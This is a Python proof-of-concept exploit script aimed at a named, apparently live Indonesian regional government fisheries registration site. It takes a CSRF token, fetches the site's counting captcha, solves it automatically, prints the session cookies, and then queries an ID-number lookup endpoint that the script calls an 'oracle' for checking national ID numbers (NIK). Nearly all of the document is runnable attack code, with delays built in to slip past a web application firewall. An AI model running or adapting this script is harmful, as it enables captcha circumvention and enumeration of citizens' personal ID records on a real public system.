#!/usr/bin/env python3
"""
Usage:
  python captcha_bypass_poc.py --nik <one NIK>
  python captcha_bypass_poc.py --skip-nik
"""

import argparse
import json
import re
import sys
import time

import requests

BASE = "https://perikanantangkap.situbondokab.go.id/simpadan"
ORIGIN = "https://perikanantangkap.situbondokab.go.id"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36 Edg/154.0.0.0")


def main():
    ap = argparse.ArgumentParser(description="Single-shot captcha-bypass PoC")
    ap.add_argument("--base", default=BASE, help="app base URL")
    ap.add_argument("--nik", default="3276201040211234",
                    help="ONE NIK to test the oracle with")
    ap.add_argument("--delay", type=float, default=3.0,
                    help="seconds between requests (WAF-friendly)")
    ap.add_argument("--skip-nik", action="store_true",
                    help="stop after captcha verify; do not call check_nik")
    args = ap.parse_args()

    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    })

    def req(desc, method, url, **kw):
        print("\n[%s] %s %s" % (desc, method, url))
        r = s.request(method, url, timeout=30, allow_redirects=True, **kw)
        print("  -> HTTP %s" % r.status_code)
        return r

    # establish session
    r1 = req("session", "GET", args.base + "/",
             headers={"Referer": ORIGIN + "/"})
    time.sleep(args.delay)

    # csrf token for the session
    r2 = req("csrf", "GET", args.base + "/api.php?action=get_csrf_token",
             headers={"Cache-Control": "no-cache"})
    csrf = None
    try:
        csrf = r2.json().get("csrf_token")
    except ValueError:
        pass
    if not csrf and r1.text:
        m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r1.text)
        if m:
            csrf = m.group(1)
    if not csrf:
        print("\n[!] could not obtain csrf_token; stopping")
        sys.exit(1)
    print("  csrf_token: %s" % csrf)
    time.sleep(args.delay)

    # fetch a count_items challenge
    challenge = None
    for attempt in range(1, 4):
        r3 = req("captcha-generate #%d" % attempt, "GET",
                 "%s/captcha.php?action=generate&type=count_items&_=%d"
                 % (args.base, int(time.time() * 1000)),
                 headers={"Referer": args.base + "/daftar/"})
        try:
            data = r3.json()
        except ValueError:
            print("  [!] non-JSON response; stopping")
            sys.exit(1)
        if data.get("type") == "count_items" and data.get("target") is not None:
            challenge = data
            break
        print("  server returned type=%r; retrying" % data.get("type"))
        time.sleep(args.delay)
    if not challenge:
        print("\n[!] no count_items challenge returned; stopping")
        sys.exit(1)

    print("  challenge: %s" % json.dumps(challenge, ensure_ascii=False))
    target, grid = challenge["target"], challenge["grid"]
    count = sum(1 for cell in grid if cell == target)
    print("  solved locally: target=%r -> count=%d" % (target, count))
    time.sleep(args.delay)

    # submit the solved answer
    payload = {"count": count, "csrf_token": csrf, "website": "", "email_alt": ""}
    r4 = req("captcha-verify", "POST", args.base + "/captcha.php?action=verify",
             headers={"Content-Type": "application/json",
                      "Origin": ORIGIN,
                      "Referer": args.base + "/daftar/"},
             data=json.dumps(payload))
    print("  response: %s" % r4.text[:500])
    try:
        verified = r4.json().get("success") is True
    except ValueError:
        verified = False
    if not verified:
        print("\n[!] captcha verify did not succeed; stopping")
        sys.exit(1)
    print("  [+] captcha bypassed; session cookies: %s" % dict(s.cookies))

    # do oracle call for testing
    if not args.skip_nik:
        time.sleep(args.delay)
        r5 = req("check_nik (single)", "GET",
                 "%s/api.php?action=check_nik&nik=%s&_=%d"
                 % (args.base, args.nik, int(time.time() * 1000)))
        print("  response: %s" % r5.text[:500])

    print("\n[done] bounded PoC complete")


if __name__ == "__main__":
    main()
